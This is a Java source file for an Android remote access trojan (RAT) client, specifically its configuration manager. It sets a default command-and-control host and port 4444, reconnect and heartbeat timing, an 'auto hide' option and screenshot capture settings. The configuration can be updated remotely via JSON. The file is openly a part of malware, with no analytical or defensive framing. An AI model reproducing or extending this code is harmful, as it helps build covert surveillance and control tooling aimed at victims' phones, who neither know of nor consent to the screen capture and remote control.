package com.example.client;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

/**
 * Configuration manager for RAT settings and preferences
 * Replaces hardcoded values with centralized configuration
 */
public class ConfigManager {

    private static final String TAG = "ConfigManager";
    private static final String PREFS_NAME = "rat_config";

    // Default configuration values
    private static final String DEFAULT_C2_HOST = "192.168.1.100";
    private static final int DEFAULT_C2_PORT = 4444;
    private static final long DEFAULT_RECONNECT_DELAY_MS = 30000;
    private static final long DEFAULT_HEARTBEAT_INTERVAL_MS = 60000;
    private static final int DEFAULT_MAX_RECONNECT_ATTEMPTS = 10;
    private static final long DEFAULT_COMMAND_RATE_LIMIT_MS = 1000;
    private static final int DEFAULT_MAX_COMMANDS_PER_MINUTE = 30;

    private Context context;
    private SharedPreferences prefs;

    // Configuration cache
    private Map<String, Object> configCache = new HashMap<>();

    public ConfigManager(Context context) {
        this.context = context;
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        loadConfiguration();
    }

    /**
     * Load configuration from shared preferences
     */
    private void loadConfiguration() {
        // Server configuration
        configCache.put("c2_host", prefs.getString("c2_host", DEFAULT_C2_HOST));
        configCache.put("c2_port", prefs.getInt("c2_port", DEFAULT_C2_PORT));

        // Connection settings
        configCache.put("reconnect_delay_ms", prefs.getLong("reconnect_delay_ms", DEFAULT_RECONNECT_DELAY_MS));
        configCache.put("heartbeat_interval_ms", prefs.getLong("heartbeat_interval_ms", DEFAULT_HEARTBEAT_INTERVAL_MS));
        configCache.put("max_reconnect_attempts", prefs.getInt("max_reconnect_attempts", DEFAULT_MAX_RECONNECT_ATTEMPTS));

        // Rate limiting
        configCache.put("command_rate_limit_ms", prefs.getLong("command_rate_limit_ms", DEFAULT_COMMAND_RATE_LIMIT_MS));
        configCache.put("max_commands_per_minute", prefs.getInt("max_commands_per_minute", DEFAULT_MAX_COMMANDS_PER_MINUTE));

        // Security settings
        configCache.put("enable_security_checks", prefs.getBoolean("enable_security_checks", true));
        configCache.put("enable_battery_optimization", prefs.getBoolean("enable_battery_optimization", true));
        configCache.put("enable_auto_hide", prefs.getBoolean("enable_auto_hide", true));

        // Performance settings
        configCache.put("screenshot_quality", prefs.getInt("screenshot_quality", 95));
        configCache.put("screenshot_resolution_width", prefs.getInt("screenshot_resolution_width", 1440));
        configCache.put("screenshot_resolution_height", prefs.getInt("screenshot_resolution_height", 3088));

        Log.d(TAG, "Configuration loaded successfully");
    }

    /**
     * Save configuration to shared preferences
     */
    public void saveConfiguration() {
        SharedPreferences.Editor editor = prefs.edit();

        // Server configuration
        editor.putString("c2_host", getC2Host());
        editor.putInt("c2_port", getC2Port());

        // Connection settings
        editor.putLong("reconnect_delay_ms", getReconnectDelayMs());
        editor.putLong("heartbeat_interval_ms", getHeartbeatIntervalMs());
        editor.putInt("max_reconnect_attempts", getMaxReconnectAttempts());

        // Rate limiting
        editor.putLong("command_rate_limit_ms", getCommandRateLimitMs());
        editor.putInt("max_commands_per_minute", getMaxCommandsPerMinute());

        // Security settings
        editor.putBoolean("enable_security_checks", isSecurityChecksEnabled());
        editor.putBoolean("enable_battery_optimization", isBatteryOptimizationEnabled());
        editor.putBoolean("enable_auto_hide", isAutoHideEnabled());

        // Performance settings
        editor.putInt("screenshot_quality", getScreenshotQuality());
        editor.putInt("screenshot_resolution_width", getScreenshotResolutionWidth());
        editor.putInt("screenshot_resolution_height", getScreenshotResolutionHeight());

        editor.apply();
        Log.d(TAG, "Configuration saved successfully");
    }

    // Server configuration getters/setters
    public String getC2Host() {
        return (String) configCache.get("c2_host");
    }

    public void setC2Host(String host) {
        configCache.put("c2_host", host);
    }

    public int getC2Port() {
        return (Integer) configCache.get("c2_port");
    }

    public void setC2Port(int port) {
        configCache.put("c2_port", port);
    }

    // Connection settings
    public long getReconnectDelayMs() {
        return (Long) configCache.get("reconnect_delay_ms");
    }

    public void setReconnectDelayMs(long delay) {
        configCache.put("reconnect_delay_ms", delay);
    }

    public long getHeartbeatIntervalMs() {
        return (Long) configCache.get("heartbeat_interval_ms");
    }

    public void setHeartbeatIntervalMs(long interval) {
        configCache.put("heartbeat_interval_ms", interval);
    }

    public int getMaxReconnectAttempts() {
        return (Integer) configCache.get("max_reconnect_attempts");
    }

    public void setMaxReconnectAttempts(int attempts) {
        configCache.put("max_reconnect_attempts", attempts);
    }

    // Rate limiting
    public long getCommandRateLimitMs() {
        return (Long) configCache.get("command_rate_limit_ms");
    }

    public void setCommandRateLimitMs(long limit) {
        configCache.put("command_rate_limit_ms", limit);
    }

    public int getMaxCommandsPerMinute() {
        return (Integer) configCache.get("max_commands_per_minute");
    }

    public void setMaxCommandsPerMinute(int max) {
        configCache.put("max_commands_per_minute", max);
    }

    // Security settings
    public boolean isSecurityChecksEnabled() {
        return (Boolean) configCache.get("enable_security_checks");
    }

    public void setSecurityChecksEnabled(boolean enabled) {
        configCache.put("enable_security_checks", enabled);
    }

    public boolean isBatteryOptimizationEnabled() {
        return (Boolean) configCache.get("enable_battery_optimization");
    }

    public void setBatteryOptimizationEnabled(boolean enabled) {
        configCache.put("enable_battery_optimization", enabled);
    }

    public boolean isAutoHideEnabled() {
        return (Boolean) configCache.get("enable_auto_hide");
    }

    public void setAutoHideEnabled(boolean enabled) {
        configCache.put("enable_auto_hide", enabled);
    }

    // Performance settings
    public int getScreenshotQuality() {
        return (Integer) configCache.get("screenshot_quality");
    }

    public void setScreenshotQuality(int quality) {
        configCache.put("screenshot_quality", quality);
    }

    public int getScreenshotResolutionWidth() {
        return (Integer) configCache.get("screenshot_resolution_width");
    }

    public void setScreenshotResolutionWidth(int width) {
        configCache.put("screenshot_resolution_width", width);
    }

    public int getScreenshotResolutionHeight() {
        return (Integer) configCache.get("screenshot_resolution_height");
    }

    public void setScreenshotResolutionHeight(int height) {
        configCache.put("screenshot_resolution_height", height);
    }

    /**
     * Get configuration as JSON object
     */
    public JSONObject getConfigurationAsJson() throws JSONException {
        JSONObject config = new JSONObject();
        config.put("c2_host", getC2Host());
        config.put("c2_port", getC2Port());
        config.put("reconnect_delay_ms", getReconnectDelayMs());
        config.put("heartbeat_interval_ms", getHeartbeatIntervalMs());
        config.put("max_reconnect_attempts", getMaxReconnectAttempts());
        config.put("command_rate_limit_ms", getCommandRateLimitMs());
        config.put("max_commands_per_minute", getMaxCommandsPerMinute());
        config.put("enable_security_checks", isSecurityChecksEnabled());
        config.put("enable_battery_optimization", isBatteryOptimizationEnabled());
        config.put("enable_auto_hide", isAutoHideEnabled());
        config.put("screenshot_quality", getScreenshotQuality());
        config.put("screenshot_resolution_width", getScreenshotResolutionWidth());
        config.put("screenshot_resolution_height", getScreenshotResolutionHeight());
        return config;
    }

    /**
     * Update configuration from JSON object
     */
    public void updateConfigurationFromJson(JSONObject config) throws JSONException {
        if (config.has("c2_host")) setC2Host(config.getString("c2_host"));
        if (config.has("c2_port")) setC2Port(config.getInt("c2_port"));
        if (config.has("reconnect_delay_ms")) setReconnectDelayMs(config.getLong("reconnect_delay_ms"));
        if (config.has("heartbeat_interval_ms")) setHeartbeatIntervalMs(config.getLong("heartbeat_interval_ms"));
        if (config.has("max_reconnect_attempts")) setMaxReconnectAttempts(config.getInt("max_reconnect_attempts"));
        if (config.has("command_rate_limit_ms")) setCommandRateLimitMs(config.getLong("command_rate_limit_ms"));
        if (config.has("max_commands_per_minute")) setMaxCommandsPerMinute(config.getInt("max_commands_per_minute"));
        if (config.has("enable_security_checks")) setSecurityChecksEnabled(config.getBoolean("enable_security_checks"));
        if (config.has("enable_battery_optimization")) setBatteryOptimizationEnabled(config.getBoolean("enable_battery_optimization"));
        if (config.has("enable_auto_hide")) setAutoHideEnabled(config.getBoolean("enable_auto_hide"));
        if (config.has("screenshot_quality")) setScreenshotQuality(config.getInt("screenshot_quality"));
        if (config.has("screenshot_resolution_width")) setScreenshotResolutionWidth(config.getInt("screenshot_resolution_width"));
        if (config.has("screenshot_resolution_height")) setScreenshotResolutionHeight(config.getInt("screenshot_resolution_height"));

        saveConfiguration();
    }

    /**
     * Reset configuration to defaults
     */
    public void resetToDefaults() {
        SharedPreferences.Editor editor = prefs.edit();
        editor.clear();
        editor.apply();

        loadConfiguration();
        Log.d(TAG, "Configuration reset to defaults");
    }
}
